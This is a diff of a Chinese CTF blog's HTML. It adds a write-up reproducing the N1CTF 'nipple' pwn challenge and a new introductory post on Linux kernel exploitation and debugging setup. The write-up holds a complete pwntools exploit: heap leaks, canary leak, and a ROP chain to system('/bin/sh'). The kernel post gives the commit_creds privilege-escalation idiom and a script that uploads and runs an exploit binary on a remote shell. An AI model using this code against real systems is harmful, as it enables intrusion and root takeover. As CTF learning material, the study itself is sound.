@@ -138,13 +138,13 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-count">6</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -224,9 +224,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2025-11-03 14:42:17 / 修改时间：16:18:38" itemprop="dateCreated datePublished" datetime="2025-11-03T14:42:17+08:00">2025-11-03</time>
+      <time title="创建时间：2025-11-03 14:42:17" itemprop="dateCreated datePublished" datetime="2025-11-03T14:42:17+08:00">2025-11-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-11-05 07:58:28" itemprop="dateModified" datetime="2025-11-05T07:58:28+08:00">2025-11-05</time>
     </span>
 
   
@@ -241,7 +247,7 @@
     <div class="post-body" itemprop="articleBody">
           <p>跟着共享文档中师傅写的wp复现了一遍nipple（这是整个比赛中我唯一有能力复现的题目</p>
 <p>题目乍看是一道比较经典的菜单题<img src="/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1.png" alt="截屏2025-11-03 14.45.50"></p>
-<p>然而初步逆向时却发现还是挺复杂的，特别是一些输出以及读入逻辑：简单来说对于某些特定的内容程序会用一个函数存入<code>(void *)operator new[]((unsigned __int64)v4);</code>动态内存中，然而对于存取也进行了一系列的操作：<strong>他会申请（原始大小*2+2）字节的chunk并将原始data中每个字节的低4位作为单独一字节的低4位同时保留原先动态内存中该字节高4位的值，高4位作为下一个字节的第四位的值保留原先高四位</strong></p>
+<p>然而初步逆向时却发现还是挺复杂的，特别是一些输出以及读入逻辑：简单来说对于某些特定的内容程序会用一个自定义函数存入动态内存中，然而对于读取也进行了一系列的操作：就对于我数据的存取而言，<strong>他会申请（原始大小*2+2）字节的chunk并将原始data中每个字节的低4位作为单独一字节的低4位同时保留原先动态内存中该字节高4位的值，高4位作为下一个字节的第四位的值保留原先高四位</strong></p>
 <p>这里举一个例子：</p>
 <p><img src="/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/2.png" alt="截屏2025-11-03 14.55.52"></p>
 <p>经过函数加工存储为:</p>
@@ -261,6 +267,142 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gdb&#x27;</span>,<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;16296&#x27;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./attachment&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">i, prompt=<span class="string">b&#x27;Choice: &#x27;</span></span>):</span><br><span class="line">    p.sendlineafter(prompt, <span class="built_in">str</span>(i).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length</span>):</span><br><span class="line">    cmd(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Length (bytes, 0..0xf000): &quot;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,length,content</span>):</span><br><span class="line">    cmd(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Length (bytes, 0..0xf000): &quot;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    p.sendafter(<span class="string">&quot;Data: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">staylower</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> data == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>  <span class="comment"># 或者返回 b&#x27;\x00&#x27; 如果你需要处理0</span></span><br><span class="line">    </span><br><span class="line">    ret = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    iterator = []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提取低4位</span></span><br><span class="line">    temp = data</span><br><span class="line">    <span class="keyword">while</span> temp != <span class="number">0</span>:</span><br><span class="line">        iterator.append(temp &amp; <span class="number">0xf</span>)</span><br><span class="line">        temp &gt;&gt;= <span class="number">8</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 组合字节</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(iterator) // <span class="number">2</span>):</span><br><span class="line">        a = iterator[<span class="number">2</span> * i]</span><br><span class="line">        b = iterator[<span class="number">2</span> * i + <span class="number">1</span>]</span><br><span class="line">        result = (a &lt;&lt; <span class="number">4</span>) + b</span><br><span class="line">        ret += <span class="built_in">bytes</span>([result])  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">add(<span class="number">0x3b</span>) <span class="comment">#改堆块存cannary</span></span><br><span class="line"><span class="comment">#泄露libc与heap地址</span></span><br><span class="line">add(<span class="number">0xf000</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">0xf000</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">leak_libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address=leak_libc-<span class="number">0x203b20</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">pop_rdi=libc.address+<span class="number">0x10f75b</span></span><br><span class="line">ret=libc.address+<span class="number">0x2a875</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">add(<span class="number">0x23</span>)<span class="comment">#改堆块在内存池之前，用来溢出覆盖堆块指针</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">leak_heap=u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">target=(leak_heap&lt;&lt;<span class="number">12</span>)+<span class="number">0x601</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(target))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak cnnary</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>)+<span class="string">b&#x27;\n\n&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment">#改指针➕泄露</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x3c</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x24</span>)+staylower(<span class="number">0x1011</span>)+<span class="string">b&#x27;\x00\x00\x00&#x27;</span>+staylower(target)+<span class="string">b&#x27;\n\n&#x27;</span>)</span><br><span class="line">debug()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recv(<span class="number">0x17</span>)</span><br><span class="line">out_put=p.recv(<span class="number">9</span>).<span class="built_in">hex</span>().lstrip(<span class="string">&#x27;0x&#x27;</span>)[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">cannary=u64(<span class="built_in">bytes</span>.fromhex(out_put))</span><br><span class="line">log.success(out_put)</span><br><span class="line">log.success(<span class="built_in">hex</span>(cannary))</span><br><span class="line"><span class="comment">#修复指针</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x3c</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x24</span>)+staylower(<span class="number">0x1011</span>)+<span class="string">b&#x27;\x00\x00\x00&#x27;</span>+staylower(target-<span class="number">1</span>)+<span class="string">b&#x27;\n\n&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment">#栈溢出ROP</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x78</span>,cyclic(<span class="number">0x18</span>)+p64(cannary)+cyclic(<span class="number">0x38</span>)+p64(pop_rdi)+p64(<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)))+p64(ret)+p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])+<span class="string">b&#x27;\n\n&#x27;</span>)</span><br><span class="line"><span class="comment">#触发ret</span></span><br><span class="line">cmd(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <h2 id="总结收获"><a href="#总结收获" class="headerlink" title="总结收获"></a>总结收获</h2><p>总的来说题目的利用手法并不是很难，堆溢出泄露数据➕栈溢出。但是题目的逆向量相对较大，对于堆的开辟以及释放过程比较绕，数据写入读取逻辑需要细心逆向。对于ida一打开感觉很难从头逆到尾的程序可以先gdb动态调试一下，关注堆块以及数据的变化再结合静态逆向食用效果更佳！</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/03/linux%E5%86%85%E6%A0%B8%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="no_t1me">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="No_t1me's blog">
+      <meta itemprop="description" content="逝者如斯夫，不舍昼夜">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | No_t1me's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/11/03/linux%E5%86%85%E6%A0%B8%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="post-title-link" itemprop="url">linux内核初探及环境搭建</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-11-03 01:36:58" itemprop="dateCreated datePublished" datetime="2025-11-03T01:36:58+08:00">2025-11-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-11-05 08:10:46" itemprop="dateModified" datetime="2025-11-05T08:10:46+08:00">2025-11-05</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>开始步入linux内核的学习。打算实践为主导，先自己搭一个内核调试的环境，并在过程中学习遇到的相关知识</p>
+<h2 id="内核态与用户态的分割"><a href="#内核态与用户态的分割" class="headerlink" title="内核态与用户态的分割"></a>内核态与用户态的分割</h2><ul>
+<li>安全性的考虑：用户态中恶意程序无法执行特权指令，破坏系统。其中内核态空间用户态应用无权访问。</li>
+<li>稳定性的保障：用户态中程序发生错误并不会导致内核的运作发生错误而影响整个系统的稳定性</li>
+<li>抽象化硬件调度操作：内核为用户态实现<strong>统一的设备访问接口</strong>（系统调用），用户程序无需关注不同设备的交互细节</li>
+</ul>
+<p>在用户态程序中，通常利用read等系统调用后就能实现对应的写内存等操作，其中的实现细节便是在内核态中完成的。</p>
+<h2 id="编译运行一个linux内核"><a href="#编译运行一个linux内核" class="headerlink" title="编译运行一个linux内核"></a>编译运行一个linux内核</h2><p>网上很多相关的步骤，算是步入内核大门的第一步。这里详细记录一下本人通过这个实践的收获：</p>
+<h3 id="忽略内核模块签名验证"><a href="#忽略内核模块签名验证" class="headerlink" title="忽略内核模块签名验证"></a>忽略内核模块签名验证</h3><blockquote>
+<p> <em><strong>Linux内核从3.7版本开始引入了模块签名验证机制。开启后，内核在加载模块时会使用内置的公钥对模块的签名进行校验，以确保模块的完整性和来源可信。这对于安全至关重要，但在开发和编译阶段，它可能会带来不便，因为默认情况下，内核会尝试使用自己编译过程中生成的一套密钥来签名模块。</strong></em></p>
+</blockquote>
+<p>因为后面会利用该内核编译一些自己写的内核模块，所以在编译之前需要禁用相应选项。</p>
+<h3 id="内核镜像与磁盘镜像"><a href="#内核镜像与磁盘镜像" class="headerlink" title="内核镜像与磁盘镜像"></a>内核镜像与磁盘镜像</h3><p>在实验中我分别下载linux内核文件以及busybox分别编译，最终获得下述两个文件:<code>bzImage</code>与<code>rootfs.img</code></p>
+<h4 id="bzImage"><a href="#bzImage" class="headerlink" title="bzImage"></a>bzImage</h4><ul>
+<li><code>bzImage</code> 的意思是 “big zImage”，是经过压缩的Linux内核二进制文件</li>
+<li>它包含了Linux内核的所有代码：进程调度、内存管理、设备驱动、文件系统支持、网络协议栈等</li>
+</ul>
+<h4 id="rootfs-img"><a href="#rootfs-img" class="headerlink" title="rootfs.img"></a>rootfs.img</h4><ul>
+<li>一个包含了完整Linux系统<strong>目录结构</strong>和<strong>必要文件</strong>的磁盘映像。</li>
+<li>由BusyBox等工具制作，包含了Shell、核心工具（<code>ls</code>, <code>cp</code>, <code>mkdir</code>等）、库文件、配置文件和初始化脚本</li>
+</ul>
+<h4 id="启动流程"><a href="#启动流程" class="headerlink" title="启动流程"></a>启动流程</h4><p>+———————————+<br>          BIOS&#x2F;UEFI                  ← 硬件启动<br>+———————————+<br>           ↓<br>+———————————+<br>         Bootloader (GRUB)            ← 加载 bzImage 到内存<br>+———————————+<br>           ↓<br>+———————————+<br>       Linux Kernel (bzImage)        ← 解压、初始化硬件、驱动<br>+———————————+<br>           ↓ (通过内核参数指定 rootfs)<br>+———————————+<br>      挂载根文件系统 (rootfs.img)      ← 从磁盘&#x2F;内存&#x2F;网络找到 rootfs<br>+———————————+<br>           ↓<br>+———————————+<br>     执行 &#x2F;init 或 &#x2F;sbin&#x2F;init       ← 第一个用户空间进程 (PID 1)<br>+———————————+<br>           ↓<br>+———————————+<br>         Shell 或系统服务             ← 完整的用户空间环境<br>+———————————+</p>
+<blockquote>
+<p>挂载：一开始的内核只有临时的目录结构，真正健全的目录系统rootfs.img还在磁盘上，挂载能够<strong>将存储设备上的文件系统关联到目录树的某个位置，使得内核可以通过文件路径访问存储设备的内容</strong>，内核系统能够正常启动离不开若干次成功的挂载。</p>
+</blockquote>
+<h2 id="编译一个简单内核模块"><a href="#编译一个简单内核模块" class="headerlink" title="编译一个简单内核模块"></a>编译一个简单内核模块</h2><p>内核模块的文件后缀是.ko       </p>
+<p>一般用c实现内核模块的编写，通过同目录下的Kbuild文件以及Makefile实现编译操作。便可以在系统中使用insmod载入模块，rfmod卸载模块。</p>
+<p><img src="/2025/11/03/linux%E5%86%85%E6%A0%B8%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1.png"></p>
+<blockquote>
+<p>当在内核模块能够控制到函数的rip(程序执行流)，就能够通过某些方法实现提权一般来说躲不开两个函数：<code>commit_creds_kfunc(prepare_kernel_cred_kfunc(0))</code>这两个函数配合的效果会将当前进程变成0环，从而实现提取。同时要注意内核态要正确过渡到用户态我们才能自由利用提权成果</p>
+</blockquote>
+<p><em><strong>注意内核模块的逻辑运行环境是内核态，这其中有许多机制与用户态不同，这也是后续我需要学习的内容。</strong></em></p>
+<h3 id="内核模块与用户交互机制"><a href="#内核模块与用户交互机制" class="headerlink" title="内核模块与用户交互机制"></a>内核模块与用户交互机制</h3><p>用户与内核模块程序交互相对于用户态程序较为麻烦，存在多种方式：</p>
+<ul>
+<li><strong>&#x2F;proc ，&#x2F;sys文件系统</strong></li>
+<li><strong>ioctl 命令</strong></li>
+<li><strong>netlink 套接字</strong></li>
+<li>注册系统调用&#x2F;中断</li>
+</ul>
+<p>与破解内核模块的第一步就是搞清楚它实现的与用户交互的机制从而正确测试各项功能，这里有篇文章详细地解释并实现了各种交互方式：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/adam-ma/p/18084237">https://www.cnblogs.com/adam-ma/p/18084237</a></p>
+<h4 id="file-operations结构体"><a href="#file-operations结构体" class="headerlink" title="file_operations结构体"></a>file_operations结构体</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">my_device_fops</span> =</span> &#123;</span><br><span class="line">    .owner = THIS_MODULE,							<span class="comment">//指向拥有者</span></span><br><span class="line">    .open = my_device_open,							<span class="comment">//处理打开操作</span></span><br><span class="line">    .release = my_device_release,			<span class="comment">//处理close操作</span></span><br><span class="line">    .read = my_device_read,           <span class="comment">// 处理读取操作</span></span><br><span class="line">    .write = my_device_write,         <span class="comment">// 处理写入操作  </span></span><br><span class="line">    .unlocked_ioctl = my_device_ioctl,<span class="comment">// 处理控制命令</span></span><br><span class="line">    .llseek = my_device_llseek,       <span class="comment">// 处理文件定位</span></span><br><span class="line">&#125;; <span class="comment">//这里只展示了常见的操作</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="cdev-字符设备对象"><a href="#cdev-字符设备对象" class="headerlink" title="cdev - 字符设备对象"></a>cdev - 字符设备对象</h4><p>代表内核中的一个<strong>字符设备实例</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>              <span class="comment">// 内嵌的kobject，用于设备模型</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span>             <span class="comment">// 指向拥有此设备的模块</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">ops</span>;</span> <span class="comment">// 文件操作函数集</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span>            <span class="comment">// 连接到cdev_map的链表</span></span><br><span class="line">    <span class="type">dev_t</span> dev;                        <span class="comment">// 设备号（主设备号 + 次设备号）</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count;               <span class="comment">// 设备数量（次设备号范围）</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="字符串设备init常见流程"><a href="#字符串设备init常见流程" class="headerlink" title="字符串设备init常见流程"></a>字符串设备init常见流程</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">dev_t</span> devno = MKDEV(DEVICE_MAJOR, DEVICE_MINOR);   <span class="comment">//构造设备号</span></span><br><span class="line">register_chrdev_region(devno, <span class="number">1</span>, DEVICE_NAME);   <span class="comment">//向内核“登记”设备号区间</span></span><br><span class="line">cdev_init(&amp;my_device_cdev, &amp;my_device_fops);  <span class="comment">//初始化字符设备对象，并赋予文件操作指针</span></span><br><span class="line">my_device_cdev.owner = THIS_MODULE;    <span class="comment">//指定模块所有者</span></span><br><span class="line">cdev_add(&amp;my_device_cdev, devno, <span class="number">1</span>); <span class="comment">//把字符设备正式放进内核</span></span><br><span class="line">char_class = class_create(THIS_MODULE, CLASS_NAME);  <span class="comment">//创建设备类</span></span><br><span class="line">char_device = device_create(char_class, <span class="literal">NULL</span>, devno, <span class="literal">NULL</span>, DEVICE_NAME); <span class="comment">//创建设备文件</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>对于dev&#x2F;DEVICE_NAME文件的操作会映射成内核模块的操作</p>
+<h2 id="如何pwn？"><a href="#如何pwn？" class="headerlink" title="如何pwn？"></a>如何pwn？</h2><p>一般来说题目会给一个bzImage对应编译好的内核镜像，roofts.img对应着文件系统的镜像，并给一个启动脚本，利用启动脚本能够qemu启动内核，在启动脚本中加入-g方便gdb调试。exp的形式一般是用c语言编译成elf文件，在题目给定的内核环境中与有漏洞的ko内核模块进行交互实现提权的操作。</p>
+<h4 id="本地打法："><a href="#本地打法：" class="headerlink" title="本地打法："></a>本地打法：</h4><p>构造sh文件编译exp并整合到rootfs.img文件镜像中，shell脚本如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译 exploit</span></span><br><span class="line">echo &quot;[*] Compiling exploit...&quot;</span><br><span class="line">gcc exp.c -static -masm=intel -g -o exploit || &#123;</span><br><span class="line">    echo &quot;[-] Compilation failed!&quot;</span><br><span class="line">    exit 1</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打包文件系统</span></span><br><span class="line">echo &quot;[*] Creating rootfs.cpio...&quot;</span><br><span class="line">sudo bash -c &quot;find . | cpio -o --format=newc &gt; ../rootfs.cpio&quot; || &#123;</span><br><span class="line">    echo &quot;[-] Failed to create cpio archive!&quot;</span><br><span class="line">    exit 1</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">返回上级目录</span></span><br><span class="line">cd ..</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动内核</span></span><br><span class="line">echo &quot;[*] Launching kernel...&quot;</span><br><span class="line">sudo ./start.sh</span><br></pre></td></tr></table></figure>
+
+<h4 id="远程打法："><a href="#远程打法：" class="headerlink" title="远程打法："></a>远程打法：</h4><p>将攻击程序传输到远程中并运行，这时会出现攻击可执行文件过大的问题(因为是静态编译)，比较通用的解决方法是将 exploit 进行 base64 编码后传输。python脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./exp&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exp = base64.b64encode(f.read())</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">11451</span>)  <span class="comment">#连接远程地址</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./run.sh&#x27;)</span></span><br><span class="line">try_count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p.sendline()</span><br><span class="line">    p.recvuntil(<span class="string">&quot;/ $&quot;</span>)</span><br><span class="line"></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(exp), <span class="number">0x200</span>):</span><br><span class="line">        p.sendline(<span class="string">&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="number">0x200</span>].decode() + <span class="string">&quot;\&quot; &gt;&gt; /tmp/b64_exp&quot;</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        log.info(<span class="string">&quot;count: &quot;</span> + <span class="built_in">str</span>(count))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;/ $&quot;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&quot;cat /tmp/b64_exp | base64 -d &gt; /tmp/exploit&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;chmod +x /tmp/exploit&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;/tmp/exploit &quot;</span>)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
 
       
     </div>
